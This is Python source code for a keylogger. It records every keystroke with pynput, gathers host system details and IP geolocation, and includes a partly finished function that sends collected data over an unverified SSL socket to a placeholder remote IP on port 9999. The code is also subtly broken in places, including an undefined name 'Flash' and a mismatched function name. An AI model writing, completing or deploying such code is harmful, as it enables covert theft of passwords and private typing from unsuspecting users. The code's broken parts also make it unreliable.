# Import required modules
from pynput.keyboard import Key, Listener
import datetime
import socket
import platform
import requests
import ssl
import os  # Required for file handling

from win32gui import FlashWindowEx

# Initialize variables
keys = []

# Function to get computer information
def get_computer_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        system = platform.system()
        release = platform.release()
        version = platform.version()
        machine = platform.machine()
        processor = platform.processor()

        computer_info = (
            f"Hostname: {hostname}\n"
            f"IP Address: {ip_address}\n"
            f"Operating System: {system} {release}\n"
            f"OS Version: {version}\n"
            f"Machine: {machine}\n"
            f"Processor: {processor}\n"
        )
        return computer_info
    except Exception as e:
        return f"Could not retrieve computer info: {e}"

# Function to get geolocation details
def get_geo_location():
    try:
        response = requests.get("https://ipinfo.io/json", timeout=5)
        if response.status_code == 200:
            data = response.json()
            location = (
                f"IP Address: {data.get('ip')}\n"
                f"City: {data.get('city')}\n"
                f"Region: {data.get('region')}\n"
                f"Country: {data.get('country')}\n"
                f"Location (Lat, Long): {data.get('loc')}\n"
                f"Organization: {data.get('org')}\n"
            )
            return location
        else:
            return "Failed to get geo-location data."
    except Exception as e:
        return f"Error retrieving geo-location: {e}"

# Function to handle key press events
def on_press(key):
    global keys
    keys.append(key)
    print(f"{key} pressed")

# Function to format keys
def format_keys(keys):
    log_parts = []
    for key in keys:
        k = str(key).replace("'", "")
        if "space" in k:
            log_parts.append(' ')
        elif "enter" in k:
            log_parts.append('[ENTER]')
        elif "backspace" in k:
            if log_parts:
                log_parts.pop()
        elif "Key" in k:
            log_parts.append(f"[{k.upper()}]")
        else:
            log_parts.append(k)
    return ''.join(log_parts)

# Function to handle key release events
def on_release(key):
    global keys
    if key == Key.esc:
        if keys:
            log_data = format_keys(keys)
            # Here is where you'll plug in your new SSL/socket sender
            print("\n=== Collected Logs ===")
            print(log_data)
            print("======================")
            # For now we just print, but you can call send_logs_to_gui(log_data) here
        return False


def send_data_to_gui(data):
    context = ssl.create_default_context()
    context.check_hostname = Flash
    context.verify_mode = ssl.CERT_NONE # For testing only - skip verification

    try:
        with socket.create_connection(("YOUR_PUBLIC_OR_LOCAL_IP", 9999)) as sock:
            with context.wrap_socket(sock, server_hostname="yourdomain.com") as ssock:
                ssock.sendall(data.encode())
    except Exception as e:
        print(f"[!] SSL send failded: {e}")


# Start the keyboard listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
